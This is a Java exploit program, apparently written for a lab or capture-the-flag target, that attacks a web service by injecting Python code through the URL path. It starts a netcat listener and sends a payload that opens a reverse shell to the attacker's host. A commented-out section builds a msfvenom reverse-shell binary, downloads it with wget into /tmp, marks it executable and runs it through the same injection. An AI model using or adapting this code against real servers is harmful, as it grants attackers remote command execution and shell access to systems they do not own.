package COM.spti.spti;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

import threads.CommandThread;


public class App {

	public static void main(String[] args) {
				
		Thread escuchar = new Thread() {
			public void run() {
				ProcessBuilder processBuilder = new ProcessBuilder();
				processBuilder.command("bash", "-c", "nc -nvlp 4242");					
					try {
						Process process = processBuilder.start();			
						
						process.getInputStream();
						
						process.waitFor();

					} catch (IOException e) {
						e.printStackTrace();
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					} 			
			}
		};
		escuchar.start();
		System.out.println("LLEGO ACA");
		try {
			sendGET();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	
		//String LHOST = args[0];
		//String LPORT = args[1];
		
		/*String cmd = "msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f elf -o jj.elf";
		ejecutar(cmd);
		
		//CommandThread servidorPy = new CommandThread("python -m SimpleHTTPServer 80"); 
		//servidorPy.start();
		
		
		
		cmd = "wget http://10.10.16.50/jj.elf -O /tmp/jj.elf";
		get(cmd);
		System.out.println(cmd + " 1");
		cmd = "chmod +x /tmp/jj.elf";
		get(cmd);
		System.out.println(cmd + " 2");
		
		//CommandThread escuchando = new CommandThread("nc -nvlp " + LPORT); 
		//escuchando.start();
		
		System.out.println("SERVIDOR>>>>>>" + "nc -nvlp " + LPORT);
		cmd = "/tmp/jj.elf";
		get(cmd);
		System.out.println(cmd + " 3");
		
		String cmd = "wget http://10.10.16.50/jj.elf -O /tmp/jj.elf";
		URL url;
		try {
			//url = new URL("http://192.168.253.132/README.md");
			url = new URL("http://10.10.10.168:8080/';path='/';os.system('wget http://10.10.16.50/README.md -O /tmp/jj.txt');'");
			//url = new URL("http://192.168.253.132/';path='/';os.system("+"'"+cmd+"'"+");"+"'");
			HttpURLConnection con = (HttpURLConnection) url.openConnection();
			con.setRequestMethod("GET");
			con.getInputStream();
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		*/
		
				
	}

	// CommandThread servidorPython = new CommandThread("python -mSimpleHTTPServer
	// 80"); //servidorPython.start();
	public static void ejecutar(String cmd) {
		 ProcessBuilder processBuilder = new ProcessBuilder();
		 processBuilder.command("bash", "-c", cmd);
			
			try {
				Process process = processBuilder.start();			
				
				process.getInputStream();
				
				process.waitFor();
				

			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} 
	 }
	
	public static void get(String cmd) {
		
		URL url;
		try {
			url = new URL("http://10.10.10.168:8080/';path='/';os.system("+"'"+cmd+"'"+");"+"'");
			HttpURLConnection con = (HttpURLConnection) url.openConnection();
			con.getInputStream();
			con.setRequestMethod("GET");
			con.getInputStream();
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}

	

	private static void sendGET() throws IOException {
	    String q = "';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.81\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")#";
	    q=URLEncoder.encode(q,StandardCharsets.UTF_8.toString());
	    q=q.replace("+", "%20");
	    q=q.replace("%2F","/");
	    String url = "http://10.10.10.168:8080/"+q;
	    URL obj = new URL(url);
	    URLConnection con =  obj.openConnection();
	    System.out.println(con.getInputStream());
	}
}

